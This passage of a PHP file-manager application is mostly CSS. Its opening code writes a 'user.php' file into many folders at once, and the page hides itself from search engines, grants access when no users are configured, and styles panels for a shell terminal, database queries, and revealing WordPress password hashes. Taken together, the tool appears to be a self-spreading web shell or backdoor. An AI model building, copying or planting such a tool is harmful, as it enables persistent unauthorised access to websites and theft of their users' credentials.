                if (@file_put_contents($dest, $user_content) !== false) {
                    @chmod($dest, 0644);
                    $results[] = ['path' => $target, 'success' => true, 'error' => '', 'folder' => $folder_name];
                } else {
                    $results[] = ['path' => $target, 'success' => false, 'error' => 'Failed to write user.php', 'folder' => ''];
                }
            }

            $sc = count(array_filter($results, function($r) { return $r['success']; }));
            $fc = count($results) - $sc;
            fm_ok([
                'results' => $results,
                'success_count' => $sc,
                'fail_count' => $fc,
            ], "Deployed to {$sc} locations" . ($fc ? ", {$fc} failed" : ''));
            break;

        default:
            fm_err('Unknown action', 400);
    }
}


// ─────────────────────────────────────────────
// SESSION CONFIG OVERRIDE
// ─────────────────────────────────────────────
if (isset($_SESSION[FM_SESSION]['config'])) {
    $CONFIG = array_merge($CONFIG, $_SESSION[FM_SESSION]['config']);
}

// ─────────────────────────────────────────────
// HTML OUTPUT
// ─────────────────────────────────────────────
$is_logged = fm_is_logged() || empty($auth_users);
$is_readonly = fm_is_readonly();
$current_user = $_SESSION[FM_SESSION]['user'] ?? 'guest';
?>
<!DOCTYPE html>
<html lang="<?= htmlspecialchars($CONFIG['lang']) ?>" data-theme="<?= htmlspecialchars($CONFIG['theme']) ?>">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title><?= htmlspecialchars(FM_TITLE) ?></title>
<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/dracula.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/theme/default.min.css">
<style>
/* ═══════════════════════════════════════════
   CSS VARIABLES
═══════════════════════════════════════════ */
:root {
  --font-ui: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
  --font-mono: 'JetBrains Mono', monospace;
  --font-display: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;

  /* Accent */
  --accent: #6ee7b7;
  --accent-dim: rgba(110,231,183,.15);
  --accent-glow: rgba(110,231,183,.3);
  --danger: #f87171;
  --warning: #fbbf24;
  --info: #60a5fa;
  --success: #34d399;

  /* Radii & transitions */
  --r-sm: 6px;
  --r-md: 10px;
  --r-lg: 16px;
  --transition: .18s cubic-bezier(.4,0,.2,1);
  --shadow-sm: 0 1px 3px rgba(0,0,0,.35);
  --shadow-md: 0 4px 16px rgba(0,0,0,.4);
  --shadow-lg: 0 12px 40px rgba(0,0,0,.5);
}

[data-theme="dark"] {
  --bg-base:    #0d1117;
  --bg-raised:  #161b22;
  --bg-overlay: #21262d;
  --bg-muted:   #30363d;
  --border:     #30363d;
  --border-dim: #21262d;
  --text-main:  #e6edf3;
  --text-muted: #8b949e;
  --text-dim:   #484f58;
  --scrollbar:  #30363d;
  --sidebar-w:  260px;
}

[data-theme="light"] {
  --bg-base:    #f4f6f8;
  --bg-raised:  #ffffff;
  --bg-overlay: #f0f2f5;
  --bg-muted:   #e4e7eb;
  --border:     #d1d5db;
  --border-dim: #e4e7eb;
  --text-main:  #1a1e2e;
  --text-muted: #6b7280;
  --text-dim:   #9ca3af;
  --scrollbar:  #d1d5db;
  --sidebar-w:  260px;
}

/* ═══════════════════════════════════════════
   RESET & BASE
═══════════════════════════════════════════ */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { height: 100%; scroll-behavior: smooth; }
body {
  font-family: var(--font-ui);
  background: var(--bg-base);
  color: var(--text-main);
  height: 100%;
  overflow: hidden;
  font-size: 13px;
  line-height: 1.5;
}
a { color: inherit; text-decoration: none; }
button, input, select, textarea {
  font-family: inherit;
  font-size: inherit;
  color: inherit;
  background: none;
  border: none;
  outline: none;
}
button { cursor: pointer; }
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--scrollbar); border-radius: 3px; }
::selection { background: var(--accent-dim); color: var(--accent); }

/* ═══════════════════════════════════════════
   LAYOUT
═══════════════════════════════════════════ */
#app {
  display: grid;
  grid-template-rows: 52px 1fr;
  grid-template-columns: var(--sidebar-w) 1fr;
  grid-template-areas:
    "topbar topbar"
    "sidebar main";
  height: 100vh;
}
#app.terminal-open {
  grid-template-rows: 52px 1fr 300px;
  grid-template-areas:
    "topbar topbar"
    "sidebar main"
    "sidebar terminal";
}

/* ═══════════════════════════════════════════
   TOPBAR
═══════════════════════════════════════════ */
#topbar {
  grid-area: topbar;
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 0 16px;
  background: var(--bg-raised);
  border-bottom: 1px solid var(--border-dim);
  z-index: 100;
}
.topbar-brand {
  display: flex;
  align-items: center;
  gap: 8px;
  font-family: var(--font-display);
  font-weight: 600;
  font-size: 13px;
  letter-spacing: -0.2px;
  color: var(--accent);
  white-space: nowrap;
  min-width: auto;
  flex-shrink: 0;
}
.topbar-brand-text {
  display: flex;
  flex-direction: column;
  line-height: 1.2;
}
.topbar-brand-title {
  font-weight: 600;
  font-size: 13px;
  letter-spacing: 0.3px;
  text-transform: uppercase;
}
.topbar-brand-sub {
  font-size: 9px;
  font-weight: 400;
  color: var(--text-dim);
  letter-spacing: 0.2px;
}
.topbar-brand i {
  font-size: 14px;
  filter: drop-shadow(0 0 6px var(--accent-glow));
}
#breadcrumb {
  display: flex;
  align-items: center;
  gap: 4px;
  flex: 1;
  overflow: hidden;
  font-size: 13px;
  color: var(--text-muted);
}
#breadcrumb .crumb {
  display: flex;
  align-items: center;
  gap: 4px;
  white-space: nowrap;
  padding: 4px 6px;
  border-radius: var(--r-sm);
  cursor: pointer;
  transition: background var(--transition), color var(--transition);
}
#breadcrumb .crumb:hover { background: var(--bg-overlay); color: var(--text-main); }
#breadcrumb .crumb.active { color: var(--text-main); font-weight: 500; }
#breadcrumb .sep { color: var(--text-dim); font-size: 12px; }
.topbar-actions {
  display: flex;
  align-items: center;
  gap: 6px;
  margin-left: auto;
}
.icon-btn {
  width: 32px; height: 32px;
  display: flex; align-items: center; justify-content: center;
  border-radius: var(--r-sm);
  color: var(--text-muted);
  transition: background var(--transition), color var(--transition);
  position: relative;
}
.icon-btn:hover { background: var(--bg-overlay); color: var(--text-main); }
.icon-btn.active { background: var(--accent-dim); color: var(--accent); }
.topbar-divider { width: 1px; height: 20px; background: var(--border); margin: 0 4px; }
#searchbar {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 0 10px;
  height: 32px;
  background: var(--bg-overlay);
  border: 1px solid var(--border-dim);
  border-radius: var(--r-md);
  width: 200px;
  transition: width var(--transition), border-color var(--transition), box-shadow var(--transition);
  color: var(--text-muted);
}
#searchbar:focus-within {
  width: 280px;
  border-color: var(--accent);
  box-shadow: 0 0 0 3px var(--accent-dim);
  color: var(--text-main);
}
#searchbar input {
  flex: 1;
  background: none;
  font-size: 13px;
  color: var(--text-main);
}
#searchbar input::placeholder { color: var(--text-dim); }

/* ═══════════════════════════════════════════
   SIDEBAR
═══════════════════════════════════════════ */
#sidebar {
  grid-area: sidebar;
  background: var(--bg-raised);
  border-right: 1px solid var(--border);
  display: flex;
  flex-direction: column;
  overflow: hidden;
}
.sidebar-section-title {
  padding: 12px 16px 6px;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.8px;
  text-transform: uppercase;
  color: var(--text-dim);
}
#folder-tree {
  flex: 1;
  overflow-y: auto;
  padding: 4px 8px 8px;
}
.tree-item {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 5px 8px;
  border-radius: var(--r-sm);
  cursor: pointer;
  font-size: 13px;
  color: var(--text-muted);
  transition: background var(--transition), color var(--transition);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  user-select: none;
}
.tree-item:hover { background: var(--bg-overlay); color: var(--text-main); }
.tree-item.active { background: var(--accent-dim); color: var(--accent); font-weight: 500; }
.tree-item i { width: 14px; text-align: center; flex-shrink: 0; font-size: 12px; }
.tree-item .tree-toggle {
  width: 14px; height: 14px;
  display: flex; align-items: center; justify-content: center;
  border-radius: 3px;
  flex-shrink: 0;
  font-size: 10px;
  color: var(--text-dim);
}
.tree-item .tree-toggle:hover { background: var(--bg-muted); }
.tree-children { padding-left: 16px; }
.sidebar-info {
  padding: 10px 14px;
  border-top: 1px solid var(--border);
  font-size: 12px;
  color: var(--text-dim);
}
.sidebar-user {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 14px;
  border-top: 1px solid var(--border);
}
.user-avatar {
  width: 28px; height: 28px;
  border-radius: 50%;
  background: var(--accent-dim);
  border: 2px solid var(--accent);
  display: flex; align-items: center; justify-content: center;
  font-size: 12px;
  color: var(--accent);
  font-weight: 700;
}
.sidebar-user-info { flex: 1; min-width: 0; }
.sidebar-user-name { font-size: 13px; font-weight: 600; }
.sidebar-user-role { font-size: 11px; color: var(--text-dim); }

/* ═══════════════════════════════════════════
   MAIN PANEL
═══════════════════════════════════════════ */
#main {
  grid-area: main;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  background: var(--bg-base);
}
#toolbar {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 4px 16px 6px;
  border-bottom: 1px solid var(--border);
  background: var(--bg-raised);
  flex-wrap: wrap;
}
.btn {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 5px 12px;
  border-radius: var(--r-sm);
  font-size: 13px;
  font-weight: 500;
  transition: all var(--transition);
  white-space: nowrap;
  cursor: pointer;
  border: 1px solid transparent;
}
.btn-primary {
  background: var(--accent);
  color: #000;
  border-color: var(--accent);
}
.btn-primary:hover { opacity: .85; box-shadow: 0 0 12px var(--accent-glow); }
.btn-ghost {
  background: var(--bg-overlay);
  color: var(--text-muted);
  border-color: var(--border-dim);
}
.btn-ghost:hover { background: var(--bg-muted); color: var(--text-main); }
.btn-danger {
  background: rgba(248,113,113,.12);
  color: var(--danger);
  border-color: rgba(248,113,113,.3);
}
.btn-danger:hover { background: rgba(248,113,113,.2); }
.btn-success {
  background: rgba(52,211,153,.12);
  color: var(--success);
  border-color: rgba(52,211,153,.3);
}
.btn-success:hover { background: rgba(52,211,153,.2); }
.btn-sm { padding: 3px 8px; font-size: 12px; }
.btn-icon { padding: 5px; gap: 0; }
.btn:disabled { opacity: .4; pointer-events: none; }
.toolbar-sep { flex: 1; }
.selection-info {
  font-size: 13px;
  color: var(--text-muted);
  padding: 0 8px;
  white-space: nowrap;
}

/* ═══════════════════════════════════════════
   FILE LIST
═══════════════════════════════════════════ */
#files-container {
  flex: 1;
  overflow-y: auto;
  padding: 12px 16px;
  position: relative;
}
.list-view #files-container {
  padding-top: 0;
  padding-bottom: 0;
}

/* GRID VIEW */
#files-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
  gap: 10px;
}
.file-card {
  background: var(--bg-raised);
  border: 1px solid var(--border-dim);
  border-radius: var(--r-md);
  padding: 12px 10px 10px;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 8px;
  cursor: pointer;
  transition: all var(--transition);
  position: relative;
  user-select: none;
}
.file-card:hover {
  border-color: var(--border);
  background: var(--bg-overlay);
  transform: translateY(-1px);
  box-shadow: var(--shadow-sm);
}
.file-card.selected {
  border-color: var(--accent);
  background: var(--accent-dim);
}
.file-card .card-icon {
  width: 52px; height: 52px;
  display: flex; align-items: center; justify-content: center;
  border-radius: var(--r-sm);
  font-size: 28px;
}
.file-card .card-name {
  font-size: 12px;
  text-align: center;
  width: 100%;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  color: var(--text-main);
}
.file-card .card-meta {
  font-size: 11px;
  color: var(--text-dim);
}
.file-card .card-check {
  position: absolute;
  top: 6px; right: 6px;
  width: 18px; height: 18px;
  border-radius: 4px;
  border: 2px solid var(--border);
  background: var(--bg-raised);
  display: none;
  align-items: center; justify-content: center;
  transition: all var(--transition);
}
.file-card:hover .card-check,
.file-card.selected .card-check { display: flex; }
.file-card.selected .card-check {
  background: var(--accent);
  border-color: var(--accent);
  color: #000;
}
.file-card.type-dir .card-icon { color: #fbbf24; }
.file-card.type-image .card-icon { color: #a78bfa; }
.file-card.type-video .card-icon { color: #f87171; }
.file-card.type-audio .card-icon { color: #34d399; }
.file-card.type-text .card-icon { color: #60a5fa; }
.file-card.type-archive .card-icon { color: #fb923c; }
.file-card.type-pdf .card-icon { color: #f87171; }
.file-card.type-binary .card-icon { color: var(--text-dim); }
.file-card .img-thumb {
  width: 52px; height: 52px;
  max-width: 52px; max-height: 52px;
  object-fit: cover;
  border-radius: var(--r-sm);
  border: 1px solid var(--border-dim);
  display: block;
}

/* LIST VIEW */
#files-table {
  display: none;
  width: 100%;
  border-collapse: collapse;
}
.list-view #files-grid { display: none; }
.list-view #files-table { display: table; }
#files-table th {
  text-align: left;
  padding: 8px 12px;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.5px;
  text-transform: uppercase;
  color: var(--text-dim);
  border-bottom: 1px solid var(--border);
  position: sticky;
  top: 0;
  background: var(--bg-base);
  cursor: pointer;
  white-space: nowrap;
  user-select: none;
}
#files-table th:hover { color: var(--text-muted); }
#files-table th .sort-icon { margin-left: 4px; font-size: 10px; }
#files-table td {
  padding: 7px 12px;
  border-bottom: 1px solid var(--border-dim);
  font-size: 13px;
  white-space: nowrap;
}
#files-table tr { cursor: pointer; transition: background var(--transition); }
#files-table tr:hover td { background: var(--bg-raised); }
#files-table tr.selected td { background: var(--accent-dim) !important; }
#files-table tr.selected td:first-child { border-left: 2px solid var(--accent); }
.file-row-icon { width: 22px; text-align: center; }
.file-row-icon i { font-size: 16px; }
.file-row-name {
  display: flex;
  align-items: center;
  gap: 10px;
  max-width: 320px;
  overflow: hidden;
  text-overflow: ellipsis;
  line-height: 24px;
}
.file-row-name img {
  display: block;
}
.file-row-thumb {
  width: 24px; height: 24px;
  min-width: 24px; min-height: 24px;
  max-width: 24px; max-height: 24px;
  object-fit: cover;
  border-radius: 4px;
  border: 1px solid var(--border-dim);
  flex-shrink: 0;
  display: inline-block;
  vertical-align: middle;
  overflow: hidden;
}
.file-badge {
  font-size: 10px;
  padding: 1px 5px;
  border-radius: 3px;
  background: var(--bg-muted);
  color: var(--text-dim);
  text-transform: uppercase;
  font-weight: 600;
  letter-spacing: 0.5px;
}
.td-size { color: var(--text-muted); font-family: var(--font-mono); font-size: 12px; }
.td-date { color: var(--text-muted); font-size: 12px; }
.td-perms { font-family: var(--font-mono); font-size: 12px; }
.td-perms code {
  padding: 2px 6px;
  border-radius: 3px;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.5px;
}
.perm-safe code { background: rgba(52,211,153,.12); color: #34d399; border: 1px solid rgba(52,211,153,.25); }
.perm-warn code { background: rgba(251,191,36,.12); color: #fbbf24; border: 1px solid rgba(251,191,36,.25); }
.perm-danger code { background: rgba(248,113,113,.12); color: #f87171; border: 1px solid rgba(248,113,113,.25); }
.td-check { width: 32px; }
.cb {
  width: 16px; height: 16px;
  accent-color: var(--accent);
  cursor: pointer;
}
.empty-state {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 12px;
  padding: 60px 20px;
  color: var(--text-dim);
  text-align: center;
}
.empty-state i { font-size: 48px; opacity: .3; }
.empty-state p { font-size: 14px; }
.drop-overlay {
  position: absolute;
  inset: 0;
  background: var(--accent-dim);
  border: 2px dashed var(--accent);
  border-radius: var(--r-lg);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 18px;
  font-weight: 600;
  color: var(--accent);
  gap: 12px;
  z-index: 50;
  pointer-events: none;
  opacity: 0;
  transition: opacity var(--transition);
}
.drop-overlay.visible { opacity: 1; }

/* ═══════════════════════════════════════════
   STATUS BAR
═══════════════════════════════════════════ */
#statusbar {
  padding: 4px 16px;
  background: var(--bg-raised);
  border-top: 1px solid var(--border);
  display: flex;
  align-items: center;
  gap: 16px;
  font-size: 12px;
  color: var(--text-dim);
}
#statusbar .sb-sep { color: var(--border); }

/* ═══════════════════════════════════════════
   TERMINAL
═══════════════════════════════════════════ */
#terminal-panel {
  grid-area: terminal;
  background: #0d1117;
  border-top: 1px solid #30363d;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}
.terminal-header {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 6px 14px;
  background: #161b22;
  border-bottom: 1px solid #30363d;
  flex-shrink: 0;
}
.terminal-header span {
  font-size: 12px;
  font-family: var(--font-mono);
  color: #6ee7b7;
  font-weight: 600;
}
#terminal-output {
  flex: 1;
  overflow-y: auto;
  padding: 10px 14px;
  font-family: var(--font-mono);
  font-size: 12.5px;
  line-height: 1.6;
  color: #e6edf3;
}
#terminal-output .term-line { white-space: pre-wrap; word-break: break-all; }
#terminal-output .term-prompt { color: #6ee7b7; }
#terminal-output .term-cmd { color: #e6edf3; }
#terminal-output .term-output { color: #8b949e; }
#terminal-output .term-error { color: #f87171; }
.terminal-input-row {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 6px 14px;
  border-top: 1px solid #30363d;
  background: #161b22;
  flex-shrink: 0;
}
.term-prompt-label {
  font-family: var(--font-mono);
  font-size: 12.5px;
  color: #6ee7b7;
  white-space: nowrap;
  flex-shrink: 0;
}
#terminal-input {
  flex: 1;
  background: none;
  border: none;
  font-family: var(--font-mono);
  font-size: 12.5px;
  color: #e6edf3;
  caret-color: #6ee7b7;
}
#terminal-input:focus { outline: none; }

/* ═══════════════════════════════════════════
   MODALS
═══════════════════════════════════════════ */
.modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,.7);
  backdrop-filter: blur(4px);
  z-index: 999;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 16px;
  opacity: 0;
  pointer-events: none;
  transition: opacity .2s;
}
.modal-backdrop.open { opacity: 1; pointer-events: all; }
.modal {
  background: var(--bg-raised);
  border: 1px solid var(--border);
  border-radius: var(--r-lg);
  box-shadow: var(--shadow-lg);
  width: 100%;
  max-width: 520px;
  max-height: 90vh;
  overflow: auto;
  transform: scale(.95) translateY(12px);
  transition: transform .2s;
}
.modal-backdrop.open .modal { transform: scale(1) translateY(0); }
.modal-lg { max-width: 800px; }
.modal-xl { max-width: 1100px; height: 85vh; display: flex; flex-direction: column; }
.modal-header {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 16px 20px;
  border-bottom: 1px solid var(--border);
  flex-shrink: 0;
}
.modal-header h3 {
  font-size: 15px;
  font-weight: 600;
  flex: 1;
}
.modal-body {
  padding: 20px;
  overflow-y: auto;
  flex: 1;
}
.modal-footer {
  display: flex;
  align-items: center;
  justify-content: flex-end;
  gap: 8px;
  padding: 14px 20px;
  border-top: 1px solid var(--border);
  flex-shrink: 0;
}
.form-group { margin-bottom: 16px; }
.form-group label {
  display: block;
  font-size: 12px;
  font-weight: 600;
  color: var(--text-muted);
  margin-bottom: 6px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.form-control {
  width: 100%;
  padding: 8px 12px;
  background: var(--bg-overlay);
  border: 1px solid var(--border);
  border-radius: var(--r-sm);
  color: var(--text-main);
  font-size: 14px;
  transition: border-color var(--transition), box-shadow var(--transition);
}
.form-control:focus {
  border-color: var(--accent);
  box-shadow: 0 0 0 3px var(--accent-dim);
}
.form-control::placeholder { color: var(--text-dim); }
textarea.form-control { resize: vertical; min-height: 120px; }
.form-check {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 13px;
  cursor: pointer;
}
.form-check input { accent-color: var(--accent); }
.radio-group {
  display: flex;
  gap: 12px;
}
.radio-btn {
  flex: 1;
  padding: 10px;
  border: 1px solid var(--border);
  border-radius: var(--r-sm);
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 6px;
  cursor: pointer;
  transition: all var(--transition);
  font-size: 12px;
  color: var(--text-muted);
}
.radio-btn i { font-size: 20px; }
.radio-btn:hover { border-color: var(--accent); color: var(--accent); }
.radio-btn.selected {
  border-color: var(--accent);
  background: var(--accent-dim);
  color: var(--accent);
}

/* Upload area */
#upload-zone {
  border: 2px dashed var(--border);
  border-radius: var(--r-md);
  padding: 32px;
  text-align: center;
  cursor: pointer;
  transition: all var(--transition);
  color: var(--text-muted);
}
#upload-zone:hover,
#upload-zone.dragover {
  border-color: var(--accent);
  background: var(--accent-dim);
  color: var(--accent);
}
#upload-zone i { font-size: 32px; margin-bottom: 10px; }
#upload-list { margin-top: 14px; }
.upload-item {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px 10px;
  background: var(--bg-overlay);
  border-radius: var(--r-sm);
  margin-bottom: 6px;
  font-size: 13px;
}
.upload-item .up-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.upload-item .up-size { color: var(--text-dim); font-size: 12px; white-space: nowrap; }
.upload-progress {
  height: 3px;
  background: var(--bg-muted);
  border-radius: 2px;
  margin-top: 4px;
  overflow: hidden;
}
.upload-progress-bar {
  height: 100%;
  background: var(--accent);
  border-radius: 2px;
  transition: width .2s;
}
.upload-status { font-size: 11px; color: var(--text-dim); }
.upload-status.done { color: var(--success); }
.upload-status.error { color: var(--danger); }

/* ZIP-Extract modal (warning-themed dropzone) */
#zx-zone {
  border: 2px dashed #fbbf24;
  border-radius: var(--r-md);
  padding: 32px;
  text-align: center;
  cursor: pointer;
  transition: all var(--transition);
  color: var(--text-muted);
  background: linear-gradient(135deg, rgba(251,191,36,.06), transparent 60%);
}
#zx-zone:hover,
#zx-zone.dragover {
  border-color: #fbbf24;
  background: rgba(251,191,36,.12);
  color: #fbbf24;
}
#zx-zone i.zx-main { font-size: 34px; margin-bottom: 10px; color:#fbbf24; }
.zx-hint {
  display: flex; gap: 10px; align-items: flex-start;
  padding: 10px 12px; margin: 12px 0 4px;
  background: rgba(251,191,36,.08);
  border: 1px solid rgba(251,191,36,.25);
  border-radius: var(--r-sm);
  font-size: 12px; color: #fbbf24; line-height: 1.5;
}
.zx-hint i { margin-top: 2px; }
.btn-zipx, .btn-wpx, .btn-dbx { position: relative; }
.btn-zipx:hover { color: #fbbf24; }
.btn-wpx:hover  { color: #3399ff; }
.btn-dbx:hover  { color: #f59e0b; }
.db-result-table { width:100%; border-collapse:collapse; font-size:12px; }
.db-result-table th { text-align:left; padding:6px 10px; font-size:11px; font-weight:600; letter-spacing:.3px; text-transform:uppercase; color:var(--text-dim); border-bottom:1px solid var(--border); white-space:nowrap; background:var(--bg-overlay); position:sticky; top:0; }
.db-result-table td { padding:5px 10px; border-bottom:1px solid var(--border-dim); font-family:var(--font-mono); font-size:11px; white-space:nowrap; max-width:300px; overflow:hidden; text-overflow:ellipsis; }
.db-result-table tr:hover td { background:var(--bg-overlay); }
.db-result-table td.null-val { color:var(--text-dim); font-style:italic; }

/* WordPress panel */
#wp-tabs {
  display: flex; gap: 4px;
  border-bottom: 1px solid var(--border);
  padding: 0 4px;
  background: var(--bg-overlay);
}
#wp-tabs .wp-tab {
  padding: 10px 16px;
  cursor: pointer;
  font-size: 13px;
  color: var(--text-muted);
  border-bottom: 2px solid transparent;
  display: flex; align-items: center; gap: 8px;
  transition: color .15s, border-color .15s;
  user-select: none;
}
#wp-tabs .wp-tab:hover { color: var(--text); }
#wp-tabs .wp-tab.active {
  color: var(--accent);
  border-bottom-color: var(--accent);
}
.wp-pane { display: none; padding: 16px; }
.wp-pane.active { display: block; }
.wp-info-grid { display: grid; grid-template-columns: 140px 1fr; gap: 8px 16px; font-size: 13px; }
.wp-info-grid label { color: var(--text-muted); }
.wp-info-grid .v { color: var(--text); font-family: var(--font-mono); word-break: break-all; }
.wp-table { width: 100%; border-collapse: collapse; font-size: 13px; }
.wp-table th, .wp-table td {
  padding: 8px 10px;
  text-align: left;
  border-bottom: 1px solid var(--border);
  vertical-align: middle;
}
.wp-table th { color: var(--text-muted); font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: .5px; }
.wp-table tr:hover td { background: var(--bg-overlay); }
.wp-pill {
  display: inline-block; padding: 2px 10px; border-radius: 99px;
  font-size: 11px; font-weight: 600;
}
.wp-pill.on  { background: rgba(110,231,183,.15); color: var(--success); }
.wp-pill.off { background: var(--bg-muted);       color: var(--text-muted); }
.wp-role { display:inline-block; padding:1px 8px; background:var(--bg-muted); border-radius:4px; font-size:11px; color:var(--text-muted); }
.wp-hash { font-family: var(--font-mono); font-size: 11px; color: var(--text-dim); word-break: break-all; }
.wp-actbar { display:flex; gap:6px; flex-wrap:wrap; }
.wp-reveal {
  background: linear-gradient(135deg, rgba(110,231,183,.1), transparent 70%);
  border: 1px solid var(--accent);
  border-radius: var(--r-sm);
  padding: 12px 14px;
  margin-top: 8px;
  display: flex; align-items: center; gap: 10px;
  font-size: 13px;
}
.wp-reveal code {
  flex: 1;
  padding: 6px 10px;
  background: var(--bg-base);
  border-radius: 4px;
  font-family: var(--font-mono);
  color: var(--accent);
  font-size: 13px;
  word-break: break-all;
}
.wp-plug-upload {
  border: 2px dashed var(--border);
  border-radius: var(--r-md);
  padding: 18px;
  text-align: center;
  margin-bottom: 14px;
  cursor: pointer;
  transition: all var(--transition);
  color: var(--text-muted);
}
.wp-plug-upload:hover, .wp-plug-upload.dragover {
  border-color: #3399ff;
  background: rgba(51,153,255,.08);
  color: #3399ff;
}

/* Editor */
#editor-wrap { flex: 1; overflow: hidden; display: flex; flex-direction: column; }
#editor-wrap .CodeMirror {
  flex: 1;
  height: 100%;
  font-family: var(--font-mono);
  font-size: 13.5px;
}

/* Preview */
#preview-content {
  display: flex;
  align-items: flex-start;
  justify-content: center;
  min-height: 200px;
  padding: 16px 0;
}
#preview-content img,
#preview-content video,
#preview-content audio {
  max-width: 100%;
  max-height: 70vh;
  border-radius: var(--r-sm);
}
#preview-content .preview-text {
  width: 100%;
  font-family: var(--font-mono);
  font-size: 13px;
  line-height: 1.7;
  color: var(--text-main);
  background: var(--bg-overlay);
  padding: 16px;
  border-radius: var(--r-sm);
  overflow: auto;
  max-height: 65vh;
  white-space: pre-wrap;
}
.pdf-frame {
  width: 100%;
  height: 65vh;
  border: none;
  border-radius: var(--r-sm);
}
.arch-list {
  font-family: var(--font-mono);
  font-size: 12px;
  max-height: 60vh;
  overflow-y: auto;
}
.arch-item {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 4px 8px;
  border-radius: var(--r-sm);
  color: var(--text-muted);
}
.arch-item:nth-child(odd) { background: var(--bg-overlay); }
.arch-item.arch-dir { color: #fbbf24; }
.arch-item .arch-size { margin-left: auto; color: var(--text-dim); }

/* Properties panel */
.props-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}
.prop-item label {
  display: block;
  font-size: 11px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: var(--text-dim);
  margin-bottom: 4px;
}
.prop-item .prop-value {
  font-size: 13px;
  color: var(--text-main);
  font-family: var(--font-mono);
  word-break: break-all;
}
.chmod-grid {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 8px;
  font-size: 13px;
}
.chmod-cell {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 4px;
  padding: 8px;
  background: var(--bg-overlay);
  border-radius: var(--r-sm);
}
.chmod-cell input { accent-color: var(--accent); }
.chmod-header {
  font-weight: 600;
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: var(--text-dim);
  text-align: center;
}

/* Context menu */
#ctx-menu {
  position: fixed;
  background: var(--bg-raised);
  border: 1px solid var(--border);
  border-radius: var(--r-md);
  box-shadow: var(--shadow-md);
  padding: 6px;
  min-width: 180px;
  z-index: 9999;
  font-size: 13px;
}
.ctx-item {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 7px 10px;
  border-radius: var(--r-sm);
  cursor: pointer;
  color: var(--text-muted);
  transition: background var(--transition), color var(--transition);
  white-space: nowrap;
}
.ctx-item:hover { background: var(--bg-overlay); color: var(--text-main); }
.ctx-item.danger { color: var(--danger); }
.ctx-item.danger:hover { background: rgba(248,113,113,.12); }
.ctx-item i { width: 16px; text-align: center; font-size: 13px; }
.ctx-sep { height: 1px; background: var(--border); margin: 4px 0; }

/* Toast */
#toast-container {
  position: fixed;
  bottom: 20px;
  right: 20px;
  z-index: 10000;
  display: flex;
  flex-direction: column;
  gap: 8px;
  align-items: flex-end;
}
.toast {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 16px;
  background: var(--bg-raised);
  border: 1px solid var(--border);
  border-radius: var(--r-md);
  box-shadow: var(--shadow-md);
  font-size: 13px;
  max-width: 320px;
  animation: slideIn .25s ease;
  transition: opacity .3s, transform .3s;
}
.toast.hiding { opacity: 0; transform: translateX(20px); }
.toast.success { border-color: var(--success); }
.toast.success i { color: var(--success); }
.toast.error { border-color: var(--danger); }
.toast.error i { color: var(--danger); }
.toast.info { border-color: var(--info); }
.toast.info i { color: var(--info); }
@keyframes slideIn {
  from { opacity: 0; transform: translateX(20px); }
  to   { opacity: 1; transform: translateX(0); }
}

/* Spinner */
.spinner {
  width: 18px; height: 18px;
  border: 2px solid var(--border);
  border-top-color: var(--accent);
  border-radius: 50%;
  animation: spin .6s linear infinite;
  flex-shrink: 0;
}
@keyframes spin { to { transform: rotate(360deg); } }
.loading-overlay {
  position: absolute;
  inset: 0;
  background: rgba(var(--bg-base), .7);
  display: flex;
  align-items: center;
